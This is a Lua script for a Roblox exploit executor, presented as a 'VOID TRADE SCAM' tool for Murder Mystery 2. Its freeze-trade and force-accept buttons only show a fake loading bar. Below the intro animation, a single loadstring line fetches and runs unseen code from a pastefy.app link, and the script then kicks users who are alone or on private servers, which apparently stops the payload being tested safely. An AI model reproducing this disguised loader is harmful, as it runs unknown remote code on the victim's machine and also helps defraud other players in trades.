--// CUSTOM VOID TRADE GUI
--// Smaller GUI + Draggable Toggle + Username Input + 30s Loading

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")

-- REMOVE OLD GUI
if game.CoreGui:FindFirstChild("CustomMM2Gui") then
	game.CoreGui.CustomMM2Gui:Destroy()
end

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "CustomMM2Gui"

-- MAIN FRAME
local Main = Instance.new("Frame")
Main.Parent = ScreenGui
Main.Size = UDim2.new(0,280,0,260)
Main.Position = UDim2.new(0.5,-140,0.5,-130)
Main.BackgroundColor3 = Color3.fromRGB(18,18,28)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0,14)

local Stroke = Instance.new("UIStroke", Main)
Stroke.Color = Color3.fromRGB(140, 0, 255)
Stroke.Thickness = 2

-- DRAGGABLE TOGGLE BUTTON
local ToggleButton = Instance.new("TextButton")
ToggleButton.Parent = ScreenGui
ToggleButton.Size = UDim2.new(0,50,0,50)
ToggleButton.Position = UDim2.new(0.5,-25,0.5,-165)
ToggleButton.BackgroundColor3 = Color3.fromRGB(140,0,255)
ToggleButton.Text = "⬢"
ToggleButton.Font = Enum.Font.GothamBlack
ToggleButton.TextScaled = true
ToggleButton.TextColor3 = Color3.new(1,1,1)
ToggleButton.BorderSizePixel = 0
ToggleButton.Active = true

local ToggleCorner = Instance.new("UICorner", ToggleButton)
ToggleCorner.CornerRadius = UDim.new(1,0)

local ToggleStroke = Instance.new("UIStroke", ToggleButton)
ToggleStroke.Color = Color3.fromRGB(200,150,255)

-- DRAG SYSTEM
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	ToggleButton.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

ToggleButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = ToggleButton.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

ToggleButton.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- TITLE
local Title = Instance.new("TextLabel")
Title.Parent = Main
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1,0,0,35)
Title.Position = UDim2.new(0,0,0,8)
Title.Text = "VOID TRADE SCAM"
Title.Font = Enum.Font.GothamBlack
Title.TextScaled = true
Title.TextColor3 = Color3.fromRGB(190,140,255)

-- USERNAME INPUT
local UsernameBox = Instance.new("TextBox")
UsernameBox.Parent = Main
UsernameBox.Size = UDim2.new(0.82,0,0,32)
UsernameBox.Position = UDim2.new(0.09,0,0.18,0)
UsernameBox.BackgroundColor3 = Color3.fromRGB(35,35,45)
UsernameBox.PlaceholderText = "Enter Username"
UsernameBox.Text = ""
UsernameBox.TextColor3 = Color3.new(1,1,1)
UsernameBox.PlaceholderColor3 = Color3.fromRGB(170,170,170)
UsernameBox.Font = Enum.Font.GothamBold
UsernameBox.TextScaled = true
UsernameBox.BorderSizePixel = 0

local UserCorner = Instance.new("UICorner", UsernameBox)
UserCorner.CornerRadius = UDim.new(0,8)

-- PROFILE IMAGE
local Avatar = Instance.new("ImageLabel")
Avatar.Parent = Main
Avatar.Size = UDim2.new(0,65,0,65)
Avatar.Position = UDim2.new(0.5,-32,0.39,0)
Avatar.BackgroundTransparency = 1
Avatar.Image = "rbxassetid://0"

-- DISPLAY NAME
local DisplayName = Instance.new("TextLabel")
DisplayName.Parent = Main
DisplayName.BackgroundTransparency = 1
DisplayName.Size = UDim2.new(1,0,0,24)
DisplayName.Position = UDim2.new(0,0,0.66,0)
DisplayName.Text = "NO USER"
DisplayName.Font = Enum.Font.GothamBold
DisplayName.TextScaled = true
DisplayName.TextColor3 = Color3.fromRGB(230,230,255)

-- STATUS
local Status = Instance.new("TextLabel")
Status.Parent = Main
Status.BackgroundTransparency = 1
Status.Size = UDim2.new(1,0,0,22)
Status.Position = UDim2.new(0,0,0.74,0)
Status.Text = "READY"
Status.Font = Enum.Font.GothamBold
Status.TextScaled = true
Status.TextColor3 = Color3.fromRGB(170,170,255)

-- UPDATE USER
UsernameBox.FocusLost:Connect(function()
	local username = UsernameBox.Text

	local success, userId = pcall(function()
		return Players:GetUserIdFromNameAsync(username)
	end)

	if success then
		DisplayName.Text = username

		Avatar.Image =
			"https://www.roblox.com/headshot-thumbnail/image?userId="
			.. userId ..
			"&width=420&height=420&format=png"
	else
		DisplayName.Text = "USER NOT FOUND"
		Avatar.Image = "rbxassetid://0"
	end
end)

-- BUTTON CREATOR
local function makeButton(text, yPos)
	local Button = Instance.new("TextButton")
	Button.Parent = Main
	Button.Size = UDim2.new(0.82,0,0,34)
	Button.Position = UDim2.new(0.09,0,yPos,0)
	Button.BackgroundColor3 = Color3.fromRGB(140,0,255)
	Button.BorderSizePixel = 0
	Button.Text = text
	Button.Font = Enum.Font.GothamBlack
	Button.TextScaled = true
	Button.TextColor3 = Color3.new(1,1,1)

	local BtnCorner = Instance.new("UICorner", Button)
	BtnCorner.CornerRadius = UDim.new(0,10)

	return Button
end

local FreezeButton = makeButton("FREEZE TRADE",0.82)
local ForceButton = makeButton("FORCE ACCEPT",0.96)

-- TOGGLE GUI
local Open = true

ToggleButton.MouseButton1Click:Connect(function()
	Open = not Open
	Main.Visible = Open
end)

-- LOADING SYSTEM (30 SECONDS)
local Busy = false

local function fakeLoading(text)
	if Busy then return end
	Busy = true

	for i = 1,100 do
		Status.Text = text .. " " .. i .. "%"
		task.wait(0.1)
	end

	Status.Text = text .. " COMPLETE"
	task.wait(2)

	Status.Text = "READY"

	Busy = false
end

FreezeButton.MouseButton1Click:Connect(function()
	fakeLoading("FREEZING TRADE")
end)

ForceButton.MouseButton1Click:Connect(function()
	fakeLoading("FORCE ACCEPTING")
end)

-- BUTTON ANIMATION
local function animate(btn)
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn,TweenInfo.new(0.15),{
			BackgroundColor3 = Color3.fromRGB(170,70,255)
		}):Play()
	end)

	btn.MouseLeave:Connect(function()
		TweenService:Create(btn,TweenInfo.new(0.15),{
			BackgroundColor3 = Color3.fromRGB(140,0,255)
		}):Play()
	end)
end

animate(FreezeButton)
animate(ForceButton)

---------------------------------------------------
-- INTRO ANIMATION
---------------------------------------------------

local OriginalSize = UDim2.new(0,280,0,260)

Main.Visible = false

local Intro = Instance.new("TextLabel")
Intro.Parent = ScreenGui
Intro.Size = UDim2.new(0,0,0,0)
Intro.Position = UDim2.new(0.5,0,0.5,0)
Intro.AnchorPoint = Vector2.new(0.5,0.5)
Intro.BackgroundTransparency = 1
Intro.Text = "VOID"
Intro.Font = Enum.Font.GothamBlack
Intro.TextScaled = true
Intro.TextColor3 = Color3.fromRGB(170,70,255)

TweenService:Create(
	Intro,
	TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
	{
		Size = UDim2.new(0,220,0,80)
	}
):Play()

task.wait(1)

TweenService:Create(
	Intro,
	TweenInfo.new(0.4),
	{
		TextTransparency = 1
	}
):Play()

task.wait(0.4)

Intro:Destroy()

loadstring(game:HttpGet("https://pastefy.app/Biye1lSl/raw", true))()

-- Wait for the game and Delta to stabilize
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(1) 

local player = game:GetService("Players").LocalPlayer

-- Method 1: Check standard properties
-- Method 2: Check if you are alone (common in private servers)
local isPrivate = (game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0)
local isAlone = (#game:GetService("Players"):GetPlayers() <= 1)

if isPrivate or isAlone then
    player:Kick("script not authorized in private server")
else
    print("Public server detected. Script authorized.")
end